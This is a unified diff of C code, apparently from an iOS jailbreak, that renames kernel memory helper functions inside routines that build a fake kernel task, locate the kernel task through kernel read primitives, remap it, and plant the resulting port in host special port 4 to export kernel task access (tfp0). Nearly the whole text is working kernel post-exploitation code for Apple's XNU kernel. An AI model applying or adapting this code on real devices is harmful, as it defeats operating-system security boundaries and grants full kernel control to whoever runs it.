@@ -16,7 +16,7 @@
 kern_return_t mach_vm_remap(vm_map_t dst, mach_vm_address_t *dst_addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src, mach_vm_address_t src_addr, boolean_t copy, vm_prot_t *cur_prot, vm_prot_t *max_prot, vm_inherit_t inherit);
 
 uint64_t make_fake_task(uint64_t vm_map) {
-    uint64_t fake_task_kaddr = kmem_alloc_wired(0x1000);
+    uint64_t fake_task_kaddr = Kernel_alloc_wired(0x1000);
 
     void* fake_task = malloc(0x1000);
     memset(fake_task, 0, 0x1000);
@@ -24,7 +24,7 @@ uint64_t make_fake_task(uint64_t vm_map) {
     *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;
     *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;
     *(uint8_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
-    kmemcpy(fake_task_kaddr, (uint64_t) fake_task, 0x1000);
+    Kernel_memcpy(fake_task_kaddr, (uint64_t) fake_task, 0x1000);
     free(fake_task);
 
     return fake_task_kaddr;
@@ -68,7 +68,7 @@ int setHGSP4() {
     
     mach_port_t mapped_tfp0 = MACH_PORT_NULL;
     mach_port_t *port = &mapped_tfp0;
-    mach_port_t host_priv = fake_host_priv();
+    mach_port_t host_priv = FakeHostPriv();
 
     int ret;
     uint64_t remapped_task_addr = 0;
@@ -79,18 +79,18 @@ int setHGSP4() {
 
     {
         // find kernel task first
-        kernel_task_kaddr = kread64(task_self_addr() + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+        kernel_task_kaddr = KernelRead_64bits(TaskSelfAddr() + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
 
         while (kernel_task_kaddr != 0) {
-            uint64_t bsd_info = kread64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
+            uint64_t bsd_info = KernelRead_64bits(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
 
-            uint32_t pid = kread32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
+            uint32_t pid = KernelRead_32bits(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
 
             if (pid == 0) {
                 break;
             }
 
-            kernel_task_kaddr = kread64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_PREV));
+            kernel_task_kaddr = KernelRead_64bits(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_PREV));
         }
 
         if (kernel_task_kaddr == 0) {
@@ -117,11 +117,11 @@ int setHGSP4() {
 
     // strref \"Nothing being freed to the zone_map. start = end = %p\\n\"
     // or traditional \"zone_init: kmem_suballoc failed\"
-    uint64_t zone_map_kptr = find_zone_map_ref();
-    uint64_t zone_map = kread64(zone_map_kptr);
+    uint64_t zone_map_kptr = Find_zone_map_ref();
+    uint64_t zone_map = KernelRead_64bits(zone_map_kptr);
 
     // kernel_task->vm_map == kernel_map
-    uint64_t kernel_map = kread64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
+    uint64_t kernel_map = KernelRead_64bits(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
 
     uint64_t zm_fake_task_kptr = make_fake_task(zone_map);
     uint64_t km_fake_task_kptr = make_fake_task(kernel_map);
@@ -163,21 +163,21 @@ int setHGSP4() {
         return 1;
     }
 
-    uint64_t port_kaddr = find_port_address(*port);
+    uint64_t port_kaddr = FindPortAddress(*port);
     printf("[remap_kernel_task] port kaddr: 0x%llx\n", port_kaddr);
 
     make_port_fake_task_port(*port, remapped_task_addr);
 
-    if (kread64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) != remapped_task_addr) {
+    if (KernelRead_64bits(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) != remapped_task_addr) {
         printf("[remap_kernel_task] read back tfpzero kobject didnt match!\n");
         return 1;
     }
 
     // lck_mtx -- arm: 8  arm64: 16
-    const int offsetof_host_special = 0x10;
-    uint64_t host_priv_kaddr = find_port_address(mach_host_self());
-    uint64_t realhost_kaddr = kread64(host_priv_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
-    kwrite64(realhost_kaddr + offsetof_host_special + 4 * sizeof(void*), port_kaddr);
+    const int off_host_special = 0x10;
+    uint64_t host_priv_kaddr = FindPortAddress(mach_host_self());
+    uint64_t realhost_kaddr = KernelRead_64bits(host_priv_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+    KernelWrite_64bits(realhost_kaddr + off_host_special + 4 * sizeof(void*), port_kaddr);
 
     return 0;
 }
